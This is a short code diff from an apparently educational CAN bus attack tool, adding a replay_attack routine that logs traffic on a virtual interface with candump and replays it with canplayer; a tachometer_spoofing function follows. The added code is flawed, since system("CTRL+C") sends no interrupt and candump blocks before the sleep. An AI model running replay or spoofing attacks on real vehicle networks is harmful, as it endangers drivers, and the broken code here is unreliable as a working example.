@@ -47,9 +47,16 @@ void replay_attack(void){
     //send a "CTRL+C" after specified number of seconds to quit logging
     //call "canplayer -I canfile.log" on the latest logfile to replay
 
+    system("candump vcan0 -l -o mylogfile.log");
+
     int logging_time = 0;
     printf("How long to log for in seconds?\n");
     scanf("%d", &logging_time);
+
+    sleep(logging_time);
+    system("CTRL+C");
+
+    system("canplayer -l mylogfile.log");
 }
 
 void tachometer_spoofing(void){
